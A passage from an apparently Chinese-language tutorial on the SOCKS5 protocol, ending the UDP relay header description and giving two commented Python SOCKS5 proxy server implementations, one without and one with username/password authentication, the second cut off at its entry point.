<li>FRAG　当前帧序号</li>
<li>ATYP　地址类型<ul>
<li>IPV4　X‘01’</li>
<li>域名　X‘03’</li>
<li>IPV6　X‘04’</li>
</ul>
</li>
<li>DST.ADDR　目的地址</li>
<li>DST.PORT　目的端口</li>
<li>DATA　用户数据</li>
</ul>
<p>当一个UDP中继服务器决定中继一个UDP数据报的时候，它会默默的做——不会给客户端返回任何通知。同样的，如果它不能中继数据报那它就会丢弃数据报。当一个UDP中继服务器从远端主机收到一个响应数据报文的时候，它必须根据使用上述的UDP请求头对该响应报文进行封装，然后再进行所依赖的认证方法的封装处理。</p>
<h1 id="SOCKS5-服务器（Python）"><a href="#SOCKS5-服务器（Python）" class="headerlink" title="SOCKS5 服务器（Python）"></a>SOCKS5 服务器（Python）</h1><p>不需要认证：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> select
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> struct
<span class="token keyword">from</span> socketserver <span class="token keyword">import</span> StreamRequestHandler<span class="token punctuation">,</span> ThreadingTCPServer

SOCKS_VERSION <span class="token operator">=</span> <span class="token number">5</span>


<span class="token keyword">def</span> <span class="token function">generate_failed_reply</span><span class="token punctuation">(</span>address_type<span class="token punctuation">,</span> error_number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"!BBBBIH"</span><span class="token punctuation">,</span> SOCKS_VERSION<span class="token punctuation">,</span> error_number<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> address_type<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exchange_loop</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> remote<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token comment"># 等待数据</span>
        r<span class="token punctuation">,</span> w<span class="token punctuation">,</span> e <span class="token operator">=</span> select<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token punctuation">[</span>client<span class="token punctuation">,</span> remote<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> client <span class="token keyword">in</span> r<span class="token punctuation">:</span>
            data <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> remote <span class="token keyword">in</span> r<span class="token punctuation">:</span>
            data <span class="token operator">=</span> remote<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>


<span class="token keyword">class</span> <span class="token class-name">SocksProxy</span><span class="token punctuation">(</span>StreamRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Accepting connection from &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment"># 协商</span>
        <span class="token comment"># 从客户端读取并解包两个字节的数据</span>
        header <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        version<span class="token punctuation">,</span> nmethods <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!BB"</span><span class="token punctuation">,</span> header<span class="token punctuation">)</span>

        <span class="token comment"># 设置socks5协议，METHODS字段的数目大于0</span>
        <span class="token keyword">assert</span> version <span class="token operator">==</span> SOCKS_VERSION
        <span class="token keyword">assert</span> nmethods <span class="token operator">></span> <span class="token number">0</span>

        <span class="token comment"># 接受支持的方法</span>
        methods <span class="token operator">=</span> self<span class="token punctuation">.</span>get_available_methods<span class="token punctuation">(</span>nmethods<span class="token punctuation">)</span>

        <span class="token comment"># 无需认证</span>
        <span class="token keyword">if</span> <span class="token number">0</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">set</span><span class="token punctuation">(</span>methods<span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        <span class="token comment"># 发送协商响应数据包</span>
        self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"!BB"</span><span class="token punctuation">,</span> SOCKS_VERSION<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment"># 请求</span>
        version<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> _<span class="token punctuation">,</span> address_type <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!BBBB"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span> version <span class="token operator">==</span> SOCKS_VERSION

        <span class="token keyword">if</span> address_type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># IPv4</span>
            address <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntoa<span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> address_type <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>  <span class="token comment"># Domain name</span>
            domain_length <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            address <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>domain_length<span class="token punctuation">)</span>
            <span class="token comment"># address = socket.gethostbyname(address.decode("UTF-8"))  # 将域名转化为IP，这一行可以去掉</span>
        <span class="token keyword">elif</span> address_type <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>  <span class="token comment"># IPv6</span>
            addr_ip <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
            address <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntop<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET6<span class="token punctuation">,</span> addr_ip<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        port <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'!H'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

        <span class="token comment"># 响应，只支持CONNECT请求</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># CONNECT</span>
                remote <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
                remote<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
                bind_address <span class="token operator">=</span> remote<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connected to &#123;&#125; &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
            addr <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!I"</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>inet_aton<span class="token punctuation">(</span>bind_address<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            port <span class="token operator">=</span> bind_address<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token comment"># reply = struct.pack("!BBBBIH", SOCKS_VERSION, 0, 0, address_type, addr, port)</span>
            <span class="token comment"># 注意：按照标准协议，返回的应该是对应的address_type，但是实际测试发现，当address_type=3，也就是说是域名类型时，会出现卡死情况，但是将address_type该为1，则不管是IP类型和域名类型都能正常运行</span>
            reply <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"!BBBBIH"</span><span class="token punctuation">,</span> SOCKS_VERSION<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> addr<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
            <span class="token comment"># 响应拒绝连接的错误</span>
            reply <span class="token operator">=</span> generate_failed_reply<span class="token punctuation">(</span>address_type<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>reply<span class="token punctuation">)</span>

        <span class="token comment"># 建立连接成功，开始交换数据</span>
        <span class="token keyword">if</span> reply<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> cmd <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            exchange_loop<span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">,</span> remote<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_available_methods</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            methods<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> methods


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token comment"># 使用socketserver库的多线程服务器ThreadingTCPServer启动代理</span>
    <span class="token keyword">with</span> ThreadingTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9011</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SocksProxy<span class="token punctuation">)</span> <span class="token keyword">as</span> server<span class="token punctuation">:</span>
        server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要认证：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> logging
<span class="token keyword">import</span> select
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> struct
<span class="token keyword">from</span> socketserver <span class="token keyword">import</span> StreamRequestHandler<span class="token punctuation">,</span> ThreadingTCPServer

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>
SOCKS_VERSION <span class="token operator">=</span> <span class="token number">5</span>


<span class="token keyword">def</span> <span class="token function">generate_failed_reply</span><span class="token punctuation">(</span>address_type<span class="token punctuation">,</span> error_number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"!BBBBIH"</span><span class="token punctuation">,</span> SOCKS_VERSION<span class="token punctuation">,</span> error_number<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> address_type<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exchange_loop</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> remote<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token comment"># 等待数据</span>
        r<span class="token punctuation">,</span> w<span class="token punctuation">,</span> e <span class="token operator">=</span> select<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token punctuation">[</span>client<span class="token punctuation">,</span> remote<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> client <span class="token keyword">in</span> r<span class="token punctuation">:</span>
            data <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> remote <span class="token keyword">in</span> r<span class="token punctuation">:</span>
            data <span class="token operator">=</span> remote<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>


<span class="token keyword">class</span> <span class="token class-name">SocksProxy</span><span class="token punctuation">(</span>StreamRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> <span class="token string">'username'</span>
    password <span class="token operator">=</span> <span class="token string">'password'</span>

    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Accepting connection from %s:%s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>client_address<span class="token punctuation">)</span>
        
        <span class="token comment"># 协商</span>
        <span class="token comment"># 从客户端读取并解包两个字节的数据</span>
        header <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        version<span class="token punctuation">,</span> nmethods <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!BB"</span><span class="token punctuation">,</span> header<span class="token punctuation">)</span>
       
        <span class="token comment"># 设置socks5协议，METHODS字段的数目大于0</span>
        <span class="token keyword">assert</span> version <span class="token operator">==</span> SOCKS_VERSION
        <span class="token keyword">assert</span> nmethods <span class="token operator">></span> <span class="token number">0</span>
        
        <span class="token comment"># 接受支持的方法</span>
        methods <span class="token operator">=</span> self<span class="token punctuation">.</span>get_available_methods<span class="token punctuation">(</span>nmethods<span class="token punctuation">)</span>
        
        <span class="token comment"># 检查是否支持用户名/密码认证方式，不支持则断开连接</span>
        <span class="token keyword">if</span> <span class="token number">2</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">set</span><span class="token punctuation">(</span>methods<span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        
        <span class="token comment"># 发送协商响应数据包</span>
        self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"!BB"</span><span class="token punctuation">,</span> SOCKS_VERSION<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        <span class="token comment"># 校验用户名和密码</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span>
        
        <span class="token comment"># 请求</span>
        version<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> _<span class="token punctuation">,</span> address_type <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!BBBB"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span> version <span class="token operator">==</span> SOCKS_VERSION
        <span class="token keyword">if</span> address_type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># IPv4</span>
            address <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntoa<span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> address_type <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>  <span class="token comment"># 域名</span>
            domain_length <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            address <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>domain_length<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> address_type <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>  <span class="token comment"># IPv6</span>
            addr_ip <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
            address <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntop<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET6<span class="token punctuation">,</span> addr_ip<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        port <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'!H'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        
        <span class="token comment"># 响应，只支持CONNECT请求</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># CONNECT</span>
                remote <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
                remote<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
                bind_address <span class="token operator">=</span> remote<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span>
                logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Connected to %s %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
            addr <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!I"</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>inet_aton<span class="token punctuation">(</span>bind_address<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            port <span class="token operator">=</span> bind_address<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
            reply <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"!BBBBIH"</span><span class="token punctuation">,</span> SOCKS_VERSION<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> addr<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>error<span class="token punctuation">(</span>err<span class="token punctuation">)</span>
            <span class="token comment"># 响应拒绝连接的错误</span>
            reply <span class="token operator">=</span> generate_failed_reply<span class="token punctuation">(</span>address_type<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>reply<span class="token punctuation">)</span>
        
        <span class="token comment"># 建立连接成功，开始交换数据</span>
        <span class="token keyword">if</span> reply<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> cmd <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            exchange_loop<span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">,</span> remote<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_available_methods</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            methods<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> methods

    <span class="token keyword">def</span> <span class="token function">verify_credentials</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""校验用户名和密码"""</span>
        version <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span> version <span class="token operator">==</span> <span class="token number">1</span>
        username_len <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        username <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>username_len<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        password_len <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>password_len<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> username <span class="token operator">==</span> self<span class="token punctuation">.</span>username <span class="token keyword">and</span> password <span class="token operator">==</span> self<span class="token punctuation">.</span>password<span class="token punctuation">:</span>
            <span class="token comment"># 验证成功, status = 0</span>
            response <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"!BB"</span><span class="token punctuation">,</span> version<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token comment"># 验证失败, status != 0</span>
        response <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"!BB"</span><span class="token punctuation">,</span> version<span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token comment"># 使用socketserver库的多线程服务器ThreadingTCPServer启动代理</span>
